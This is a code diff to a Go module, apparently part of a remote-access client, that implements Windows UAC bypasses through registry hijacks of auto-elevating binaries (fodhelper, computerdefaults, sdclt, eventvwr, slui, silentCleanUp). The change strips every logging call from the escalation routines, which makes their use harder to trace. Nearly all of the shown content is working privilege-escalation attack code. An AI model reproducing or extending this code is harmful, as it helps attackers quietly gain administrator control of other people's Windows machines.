@@ -2,7 +2,6 @@ package client
 
 import (
 	"errors"
-	"log"
 	"os/exec"
 	"syscall"
 	"time"
@@ -13,38 +12,31 @@ import (
 // Uacbypass bypasses User Account Control of Windows and escaletes
 // priviliges to root if User has root priviliges
 func Escalate(path string) error {
-	log.Println("Path for bypass: (", path, ")")
 	version, err := GetVer()
 	if err != nil {
 		return err
 	}
 	if version == 10 {
 		if computerdefaults(path) == nil {
-			log.Println("computerdefaults")
 			return nil
 		}
 		if sdcltcontrol(path) == nil {
-			log.Println("sdcltcontrol")
 			return nil
 		}
 		if fodhelper(path) == nil {
-			log.Println("fodhelper")
 			return nil
 		}
 	}
 	if version > 9 {
 		if silentCleanUp(path) == nil {
-			log.Println("silentCleanUp")
 			return nil
 		}
 		if slui(path) == nil {
-			log.Println("slui")
 			return nil
 		}
 	}
 	if version < 10 {
 		if eventvwr(path) == nil {
-			log.Println("eventvwr")
 			return nil
 		}
 	}
@@ -56,7 +48,6 @@ func Escalate(path string) error {
 // eventvwr works on 7, 8, 8.1 fixed in win 10
 func eventvwr(path string) error {
 
-	log.Println("eventvwr")
 	key, _, err := registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
 		registry.SET_VALUE|registry.ALL_ACCESS)
@@ -86,7 +77,6 @@ func eventvwr(path string) error {
 // sdcltcontrol works on Win 10
 func sdcltcontrol(path string) error {
 
-	log.Println("sdcltcontrol")
 	var cmd *exec.Cmd
 
 	key, _, err := registry.CreateKey(
@@ -124,9 +114,6 @@ func sdcltcontrol(path string) error {
 
 // silentCleanUp works on Win 8.1, 10(patched on some Versions) even on UAC_ALWAYSnotify
 func silentCleanUp(path string) error {
-
-	log.Println("silentCleanUp")
-
 	key, _, err := registry.CreateKey(
 		registry.CURRENT_USER, `Environment`,
 		registry.SET_VALUE)
@@ -159,7 +146,6 @@ func silentCleanUp(path string) error {
 
 // computerdefaults works on Win 10 is more reliable than fodhelper
 func computerdefaults(path string) error {
-	log.Println("computerdefaults")
 	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
 
 	if err != nil {
@@ -193,9 +179,6 @@ func computerdefaults(path string) error {
 
 // fodhelper works on 10 but computerdefaults is more reliable
 func fodhelper(path string) error {
-	//
-	log.Println("fodhelper")
-
 	key, _, err := registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\ms-settings\shell\open\command`,
 		registry.SET_VALUE)
@@ -231,8 +214,6 @@ func fodhelper(path string) error {
 
 // slui works on Win 8.1, 10
 func slui(path string) error {
-	log.Println("slui")
-
 	key, _, err := registry.CreateKey(
 		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
 		registry.SET_VALUE|registry.ALL_ACCESS)
